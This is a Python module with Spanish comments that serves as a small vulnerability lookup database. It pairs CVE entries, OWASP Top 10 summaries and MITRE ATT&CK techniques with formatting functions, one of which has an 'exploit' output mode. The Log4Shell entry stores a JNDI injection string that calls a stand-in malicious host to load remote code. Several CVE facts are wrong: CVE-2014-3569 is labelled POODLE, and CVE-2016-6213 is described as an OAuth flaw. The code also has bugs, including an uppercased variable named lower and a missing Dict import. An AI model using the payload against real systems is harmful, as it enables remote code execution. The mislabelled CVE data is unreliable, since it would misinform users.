"""
Minka Vulnerabilities - CVE Research Database

Base de datos de vulnerabilidades conocidas y CVEs.
"""

# ============================================
# VULNERABILIDADES CONOCIDAS
# ============================================

VULNERABILITIES = {
    # WEB VULNERABILITIES
    "cve-2021-44228": {
        "name": "Log4Shell",
        "cve": "CVE-2021-44228",
        "severity": "CRITICAL",
        "cvss": 10.0,
        "description": "Apache Log4j2 JNDI Features Used in Message Lookup",
        "full_description": """
Apache Log4j2 <=2.14.1 does not protect against malicious user input
in message lookup patterns. An attacker can craft a malicious message
that will execute arbitrary code when logged.
        """,
        "affected": ["Apache Log4j 2.0-beta9 through 2.14.1"],
        "technique": "Remote Code Execution (RCE) via JNDI lookup",
        "exploit_example": "${jndi:ldap://malicious.com/exploit}",
        "remediation": "Upgrade to Log4j 2.15.0 or later",
        "references": [
            "https://logging.apache.org/log4j/2.x/security.html",
            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228",
        ],
        "year": 2021,
        "category": "rce",
    },
    "cve-2017-0144": {
        "name": "EternalBlue",
        "cve": "CVE-2017-0144",
        "severity": "CRITICAL",
        "cvss": 9.8,
        "description": "SMBv1 Vulnerability used by WannaCry and NotPetya",
        "full_description": """
The SMBv1 protocol in Microsoft Windows Vista, Windows Server 2008,
and Windows 7 is vulnerable to remote code execution. This vulnerability
was exploited by the WannaCry ransomware in May 2017.
        """,
        "affected": ["Windows Vista", "Windows Server 2008", "Windows 7"],
        "technique": "Remote Code Execution via SMB",
        "remediation": "Disable SMBv1 and apply security updates MS17-010",
        "references": ["https://technet.microsoft.com/en-us/library/security/ms17-010.aspx"],
        "year": 2017,
        "category": "rce",
    },
    "cve-2014-0160": {
        "name": "Heartbleed",
        "cve": "CVE-2014-0160",
        "severity": "HIGH",
        "cvss": 7.5,
        "description": "OpenSSL Heartbleed vulnerability",
        "full_description": """
A missing bounds check in the handling of the TLS heartbeat extension
could be used to read up to 64KB of memory from the server.
This could expose sensitive data including private keys.
        """,
        "affected": ["OpenSSL 1.0.1 through 1.0.1f"],
        "technique": "Information Disclosure via heap memory read",
        "remediation": "Upgrade to OpenSSL 1.0.1g or later",
        "references": ["https://www.heartbleed.com/"],
        "year": 2014,
        "category": "info_disclosure",
    },
    "cve-2017-5638": {
        "name": "Equifax Vulnerability",
        "cve": "CVE-2017-5638",
        "severity": "CRITICAL",
        "cvss": 10.0,
        "description": "Apache Struts Jakarta Multipart Parser OGNL Injection",
        "full_description": """
The Jakarta Multipart parser in Apache Struts is vulnerable to OGNL
injection attacks. An attacker can execute arbitrary commands on
the server by crafting a malicious Content-Type header.
        """,
        "affected": ["Apache Struts 2.3.5 through 2.3.31", "2.5 through 2.5.10"],
        "technique": "Remote Code Execution via OGNL injection",
        "remediation": "Upgrade to Struts 2.3.32 or 2.5.10.1",
        "references": ["https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5638"],
        "year": 2017,
        "category": "rce",
    },
    # AUTHENTICATION VULNERABILITIES
    "cve-2016-6213": {
        "name": "OAuth Vulnerability",
        "cve": "CVE-2016-6213",
        "severity": "MEDIUM",
        "cvss": 6.5,
        "description": "OAuth 2.0 Session Fixation",
        "full_description": """
OAuth 2.0 implementations may be vulnerable to session fixation
attacks when handling the state parameter incorrectly.
        """,
        "affected": ["Various OAuth implementations"],
        "technique": "Session Fixation / Authentication Bypass",
        "remediation": "Proper state parameter validation",
        "references": [],
        "year": 2016,
        "category": "auth_bypass",
    },
    # CRYPTO VULNERABILITIES
    "cve-2014-3569": {
        "name": "POODLE",
        "cve": "CVE-2014-3569",
        "severity": "MEDIUM",
        "cvss": 4.3,
        "description": "SSL 3.0 Padding Oracle Downgrade Attack",
        "full_description": """
SSL 3.0 uses padding with CBC mode ciphers, which is vulnerable
to padding oracle attacks. An attacker can decrypt communications.
        """,
        "affected": ["SSL 3.0", "Various implementations"],
        "technique": "Padding Oracle Attack",
        "remediation": "Disable SSL 3.0, use TLS 1.2+",
        "references": [],
        "year": 2014,
        "category": "crypto",
    },
    "cve-2020-0601": {
        "name": "CurveBall",
        "cve": "CVE-2020-0601",
        "severity": "HIGH",
        "cvss": 8.1,
        "description": "Windows CryptoAPI Spoofing Vulnerability",
        "full_description": """
A vulnerability in Windows CryptoAPI could allow attackers to spoof
digital certificates and signatures, enabling man-in-the-middle attacks.
        """,
        "affected": ["Windows 10", "Windows Server 2016/2019"],
        "technique": "Certificate Spoofing",
        "remediation": "Apply Windows security update (January 2020)",
        "references": [],
        "year": 2020,
        "category": "crypto",
    },
    # DESERIALIZATION VULNERABILITIES
    "cve-2017-9822": {
        "name": "DotNetNuke Cookie Deserialization",
        "cve": "CVE-2017-9822",
        "severity": "HIGH",
        "cvss": 8.3,
        "description": "DotNetNuke Cookie Deserialization RCE",
        "full_description": """
DNN (DotNetNuke) before 9.1.1 is affected by a serialization
vulnerability which allows remote attackers to execute code.
        """,
        "affected": ["DNN (DotNetNuke) 5.0.0 through 9.0.0"],
        "technique": "Deserialization leading to RCE",
        "remediation": "Upgrade to DNN 9.1.1 or later",
        "references": [],
        "year": 2017,
        "category": "deserialization",
    },
    # FILE INCLUSION
    "cve-2019-11043": {
        "name": "PHP-FPM RCE",
        "cve": "CVE-2019-11043",
        "severity": "HIGH",
        "cvss": 9.8,
        "description": "PHP-FPM Environment Variable Access RCE",
        "full_description": """
When PHP-FPM is exposed, certain configurations allow arbitrary
command execution through PATH_INFO environment variable.
        """,
        "affected": ["PHP 7.1.x through 7.3.x with FPM"],
        "technique": "Remote Code Execution via env variables",
        "remediation": "Upgrade PHP, sanitize PATH_INFO",
        "references": [],
        "year": 2019,
        "category": "rce",
    },
}

# ============================================
# CATEGORÍAS OWASP TOP 10
# ============================================

OWASP_CATEGORIES = {
    "a01_2021": {
        "name": "Broken Access Control",
        "description": "Restrictions on what authenticated users are allowed to do are not properly enforced.",
        "examples": [
            "Violation of principle of least privilege",
            "Accessing API without authentication",
            "Elevation of privilege",
            "IDOR (Insecure Direct Object References)",
        ],
        "mitigation": [
            "Deny access by default",
            "Implement access control mechanisms once",
            "Disable web server directory listing",
            "Log access control failures",
        ],
    },
    "a02_2021": {
        "name": "Cryptographic Failures",
        "description": "Previously known as Sensitive Data Exposure. Focuses on failures related to cryptography.",
        "examples": [
            "Data transmitted in clear text",
            "Weak cryptographic algorithms",
            "Missing security headers",
            "Sensitive data in URLs",
        ],
        "mitigation": [
            "Encrypt all sensitive data in transit",
            "Disable caching for sensitive data",
            "Use strong cryptographic algorithms",
            "Store passwords with strong hashing",
        ],
    },
    "a03_2021": {
        "name": "Injection",
        "description": "User-supplied data is not validated, filtered, or sanitized by the application.",
        "examples": [
            "SQL Injection",
            "NoSQL Injection",
            "OS Command Injection",
            "LDAP Injection",
            "XSS (Cross-Site Scripting)",
        ],
        "mitigation": [
            "Use safe APIs with parameterized queries",
            "Escape special characters",
            "Use LIMIT and other SQL controls",
            "Validate and sanitize input",
        ],
    },
    "a04_2021": {
        "name": "Insecure Design",
        "description": "Different types of vulnerabilities related to insecure design patterns.",
        "examples": [
            "Missing business logic controls",
            "Authentication without rate limiting",
            "Missing inventory of third-party components",
        ],
        "mitigation": [
            "Threat modeling during design",
            "Unit and integration tests",
            "Use reference architectures",
            "Establish secure design patterns",
        ],
    },
    "a05_2021": {
        "name": "Security Misconfiguration",
        "description": "Insecure default configurations, open cloud storage, verbose error messages.",
        "examples": [
            "Unnecessary features enabled",
            "Default accounts and passwords",
            "Verbose error messages",
            "Missing security headers",
        ],
        "mitigation": [
            "Harden operating systems",
            "Remove unused features/frameworks",
            "Implement segmented architecture",
            "Review and update configurations",
        ],
    },
    "a06_2021": {
        "name": "Vulnerable and Outdated Components",
        "description": "Using components with known vulnerabilities.",
        "examples": ["Using outdated libraries", "Vulnerable dependencies", "Unpatched frameworks"],
        "mitigation": [
            "Remove unused dependencies",
            "Continuously monitor versions",
            "Use Snyk/OWASP Dependency-Check",
            "Subscribe to security bulletins",
        ],
    },
    "a07_2021": {
        "name": "Identification and Authentication Failures",
        "description": "Compromised credentials, keys, or session tokens.",
        "examples": ["Credential stuffing", "Weak passwords", "Missing MFA", "Session IDs in URLs"],
        "mitigation": [
            "Implement MFA",
            "Do not deploy with default credentials",
            "Implement weak password checking",
            "Limit or delay failed login attempts",
        ],
    },
    "a08_2021": {
        "name": "Software and Data Integrity Failures",
        "description": "Software updates, CI/CD pipelines, and integrity data are not verified.",
        "examples": [
            "Insecure deserialization",
            "CI/CD without integrity verification",
            "Auto-population of parameters",
        ],
        "mitigation": [
            "Verify integrity of updates",
            "Use digital signatures",
            "Use anti-deserialization patterns",
        ],
    },
    "a09_2021": {
        "name": "Security Logging and Monitoring Failures",
        "description": "Without logging and monitoring, attacks cannot be detected.",
        "examples": ["Logs not monitored", "Audit trails not kept", "Vulnerabilities undetected"],
        "mitigation": [
            "Ensure logs are centralized",
            "Log access failures",
            "Establish alerting thresholds",
            "Use SIEM systems",
        ],
    },
    "a10_2021": {
        "name": "Server-Side Request Forgery (SSRF)",
        "description": "Web applications fetch remote resources without validating user-supplied URLs.",
        "examples": [
            "Fetching internal resources",
            "Port scanning internal networks",
            "Accessing cloud metadata",
        ],
        "mitigation": [
            "Segment network access",
            "Disable HTTP redirects",
            "Sanitize and validate URLs",
            "Block unexpected IPs/domains",
        ],
    },
}

# ============================================
# MITRE ATT&CK MATRIX (FRAGMENT)
# ============================================

ATTACK_MATRIX = {
    "initial_access": {
        "t1190": "Exploit Public-Facing Application",
        "t1133": "External Remote Services",
        "t1078": "Valid Accounts",
        "t1566": "Phishing",
    },
    "execution": {
        "t1203": "Exploitation for Client Execution",
        "t1059": "Command and Scripting Interpreter",
        "t1559": "Inter-Process Communication",
    },
    "persistence": {
        "t1547": "Boot or Logon Autostart Execution",
        "t1543": "Create or Modify System Process",
        "t1133": "External Remote Services",
    },
    "privilege_escalation": {
        "t1068": "Exploitation for Privilege Escalation",
        "t1548": "Abuse Elevation Control Mechanism",
    },
    "defense_evasion": {
        "t1070": "Indicator Removal",
        "t1564": "Hide Artifacts",
        "t1078": "Valid Accounts",
    },
    "credential_access": {
        "t1110": "Brute Force",
        "t1111": "Two-Factor Authentication Interception",
        "t1212": "Exploitation for Credential Access",
    },
    "discovery": {
        "t1087": "Account Discovery",
        "t1046": "Network Service Discovery",
        "t1580": "Cloud Infrastructure Discovery",
    },
    "lateral_movement": {"t1021": "Remote Services", "t1210": "Exploitation for Lateral Movement"},
    "collection": {"t1555": "Credentials from Password Stores", "t1560": "Archive Collected Data"},
    "exfiltration": {
        "t1041": "Exfiltration Over Command and Control Channel",
        "t1048": "Exfiltration Over Alternative Protocol",
    },
    "impact": {"t1486": "Data Encrypted for Impact", "t1499": "Endpoint Denial of Service"},
}

# ============================================
# FUNCIONES
# ============================================


async def get_cve_info(cve: str, format: str = "brief") -> str:
    """Obtiene información de un CVE específico."""

    cve_lower = cve.upper()

    # Buscar en la base de datos
    for key, vuln in VULNERABILITIES.items():
        if cve_lower in vuln["cve"]:
            return format_vuln(vuln, format)

    # Si no encuentra, buscar en OWASP
    if "owasp" in cve_lower:
        for key, owasp in OWASP_CATEGORIES.items():
            if cve_lower in key:
                return format_owasp(owasp, key)

    return f"""❌ CVE '{cve}' no encontrado en la base de datos.

**Búsquedas sugeridas:**
- CVE-2021-44228 (Log4Shell)
- CVE-2017-0144 (EternalBlue)
- CVE-2014-0160 (Heartbleed)
- A01-A10 (OWASP Top 10 2021)

**Recursos:**
- NVD: https://nvd.nist.gov/vuln/search
- CVE: https://cve.mitre.org/
- OWASP: https://owasp.org/"""


def format_vuln(vuln: Dict, format: str) -> str:
    """Formatea información de vulnerabilidad."""

    severity_colors = {"CRITICAL": "🔴", "HIGH": "🟠", "MEDIUM": "🟡", "LOW": "🟢"}

    severity_emoji = severity_colors.get(vuln["severity"], "⚪")

    if format == "brief":
        return f"""{severity_emoji} **{vuln["name"]}**

**CVE:** {vuln["cve"]}
**CVSS:** {vuln["cvss"]} ({vuln["severity"]})
**Técnica:** {vuln["technique"]}
**Remediación:** {vuln["remediation"]}"""

    elif format == "exploit":
        return f"""## {vuln["name"]}

**CVE:** {vuln["cve"]}
**CVSS:** {vuln["cvss"]} {severity_emoji}

### Técnica de Explotación

```
{vuln.get("exploit_example", vuln["technique"])}
```

### Sistemas Afectados

{chr(10).join(f"- {s}" for s in vuln["affected"])}

### Remediación

> {vuln["remediation"]}

### Referencias

{chr(10).join(f"- {r}" for r in vuln["references"])}"""

    else:  # detailed
        return f"""{severity_emoji} **{vuln["name"]}**

**CVE:** {vuln["cve"]}
**CVSS:** {vuln["cvss"]} ({vuln["severity"]})
**Año:** {vuln["year"]}
**Categoría:** {vuln["category"]}

### Descripción

{vuln["full_description"]}

### Técnica

{vuln["technique"]}

### Sistemas Afectados

{chr(10).join(f"- {s}" for s in vuln["affected"])}

### Remediación

> {vuln["remediation"]}

### Referencias

{chr(10).join(f"- {r}" for r in vuln["references"])}"""


def format_owasp(owasp: Dict, key: str) -> str:
    """Formatea información OWASP."""
    return f"""## {key.replace("_", " ").upper()}: {owasp["name"]}

### Descripción

{owasp["description"]}

### Ejemplos

{chr(10).join(f"- {e}" for e in owasp["examples"])}

### Mitigación

{chr(10).join(f"- {m}" for m in owasp["mitigation"])}"""


async def search_vulnerabilities(query: str) -> str:
    """Busca vulnerabilidades por categoría."""
    query_lower = query.lower()
    results = []

    # Buscar en CVEs
    for key, vuln in VULNERABILITIES.items():
        if (
            query_lower in vuln["category"].lower()
            or query_lower in vuln["name"].lower()
            or query_lower in vuln["technique"].lower()
        ):
            results.append(f"- {vuln['cve']}: {vuln['name']} ({vuln['severity']})")

    # Buscar en OWASP
    for key, owasp in OWASP_CATEGORIES.items():
        if query_lower in owasp["name"].lower():
            results.append(f"- OWASP {key}: {owasp['name']}")

    if not results:
        return f"No se encontraron vulnerabilidades para '{query}'"

    return f"Encontrados:\n" + "\n".join(results)
